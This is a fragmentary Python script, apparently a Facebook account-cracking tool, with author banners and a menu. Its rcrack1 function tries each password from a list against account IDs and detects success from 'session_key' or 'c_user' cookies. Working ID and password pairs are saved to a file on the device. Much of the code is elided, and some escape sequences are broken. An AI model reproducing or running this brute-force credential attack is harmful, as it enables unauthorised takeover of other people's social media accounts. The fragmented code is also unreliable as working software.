		...
		\033[1;32m     #  
         ...
         \033[1;32m   # #    #   #  #       #       #       # #   #
                                 ...
                                 #    #######       # #       #       #   # #
                                  ...
                                  #    #     #  #####  ####### ####### #
\033[1;32m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mYASEEN KHAN  \033[1;32m
{+}\033[1;32mFACEBOOK       : \033[1;32mKOKO YASEEN .869\033[1;32m
{+}\033[1;32mYOUTUBE        : \033[1;32mNO YT\033[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 1.0\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m FREE\033[1;32m
--------------------------------------------------
\033[1;37m[-]KINGX MR❤YASEEN
--------------------------------------------------""")
def linex():
	print('\033[1;32m--------------------------------------------------')
def clear():
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://m.me/YASEEN.KHAN.869');menu()
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [YASEEN-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/YASEEN-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [YASEEN-OK] '+ids+' | '+pas)
...
\033[1;92m--------------------------------------------------
{+}\033[1;32mCREATED BY     : \033[1;32mYASEEN KHAN \033[1;32m
(+}\033[1;32mFACEBOOK       : \033[1;32mMAFIA KINGS 869 \033[1;32m
{+}\033[1;32mYOUTUBE        : \033[1;32mY♥️\033A[1;32m
{+}\033[1;32mVERSION        :\033[1;32m 1.0\033[1;32m
{+}\033[1;32mSTATUS         :\033[1;32m Free\033[1;32m
--------------------------------------------------
